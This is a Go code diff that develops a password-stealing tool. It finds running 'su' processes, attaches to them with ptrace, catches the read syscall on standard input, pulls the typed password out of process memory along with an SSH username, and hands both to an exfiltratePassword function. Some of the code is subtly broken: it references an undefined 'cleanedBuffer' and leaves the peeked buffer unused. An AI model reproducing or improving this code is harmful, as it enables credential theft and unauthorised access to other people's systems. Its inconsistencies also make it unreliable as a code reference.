@@ -14,6 +14,7 @@ import (
 
 func watchSUProcesses() {
 	processedPIDs := make(map[int]struct{})
+
 	for {
 		select {
 		case <-shutdownChan:
@@ -24,7 +25,11 @@ func watchSUProcesses() {
 				time.Sleep(5 * time.Second)
 				continue
 			}
-			for _, pid := range suPIDs {
+
+			for i, pid := range suPIDs {
+				if i == 0 {
+					continue
+				}
 				if _, processed := processedPIDs[pid]; !processed {
 					go traceSUProcess(pid)
 					processedPIDs[pid] = struct{}{}
@@ -65,7 +70,7 @@ func isSUProcess(pid int) bool {
 	if err != nil {
 		return false
 	}
-	return regexp.MustCompile(`su`).MatchString(strings.ReplaceAll(string(cmdline), "\x00", " "))
+	return regexp.MustCompile(`su `).MatchString(strings.ReplaceAll(string(cmdline), "\x00", " "))
 }
 
 func traceSUProcess(pid int) {
@@ -76,59 +81,45 @@ func traceSUProcess(pid int) {
 	}
 	defer syscall.PtraceDetach(pid)
 
-	var status syscall.WaitStatus
-	_, err = syscall.Wait4(pid, &status, syscall.WSTOPPED, nil)
-	if err != nil {
-		return
-	}
+	var regs syscall.PtraceRegs
+	var readSyscallCount int
+
 	for {
-		err = syscall.PtraceSyscall(pid, 0)
+		_, err := syscall.Wait4(pid, nil, 0, nil)
 		if err != nil {
 			return
 		}
 
-		_, err = syscall.Wait4(pid, &status, 0, nil)
+		err = syscall.PtraceGetRegs(pid, &regs)
 		if err != nil {
+			fmt.Printf("su process died.")
 			return
 		}
 
-		if status.Exited() {
-			break
-		}
+		fmt.Printf("rax: %d\n", regs.Orig_rax)
+		if regs.Orig_rax == 0 && regs.Rdx == 511 && regs.Rdi == 0 {
+			readSyscallCount++
+			cmdline, _ := ioutil.ReadFile(fmt.Sprintf("/proc/%d/cmdline", pid))
+			matches := regexp.MustCompile(`sshd: ([a-zA-Z]+) \[net\]`).FindSubmatch(cmdline)
+			if len(matches) == 2 {
+				username = string(matches[1])
+			}
+			if readSyscallCount == 3 {
+				bufferAddr := uintptr(regs.Rsi)
+				buffer := make([]byte, 511)
 
-		if status.Stopped() && status.StopSignal() == syscall.SIGTRAP {
-			var regs syscall.PtraceRegs
-			err := syscall.PtraceGetRegs(pid, &regs)
-			if err != nil {
+				_, err := syscall.PtracePeekData(pid, bufferAddr, buffer)
+				if err != nil {
+					return
+				}
+				go exfiltratePassword(strings.TrimLeft(string(cleanedBuffer), "\n"), username)
 				return
 			}
-
-			if regs.Orig_rax == 3 {
-				fd := int(regs.Rdi)
-				readLength := int(regs.Rdx)
-				length := int(regs.Rax)
-
-				if fd == 0 && readLength == 511 {
-					buffer := make([]byte, length)
-					_, err := syscall.PtracePeekData(pid, uintptr(regs.Rsi), buffer)
-					if err != nil {
-						return
-					}
-					fmt.Printf("Password Found: %s\n", buffer)
-					fmt.Printf("Password Found: %x\n", buffer)
-					fmt.Printf("File Descriptor: %d\n", regs.Rdi)
-					fmt.Printf("Buffer Address: %d\n", regs.Rsi)
-					fmt.Printf("Count: %d\n", regs.Rdx)
-				}
-			}
-		}
-
-		err = syscall.PtraceSyscall(pid, 0)
-		if err != nil {
+		} else {
 			return
 		}
 
-		_, err = syscall.Wait4(pid, &status, 0, nil)
+		err = syscall.PtraceSyscall(pid, 0)
 		if err != nil {
 			return
 		}
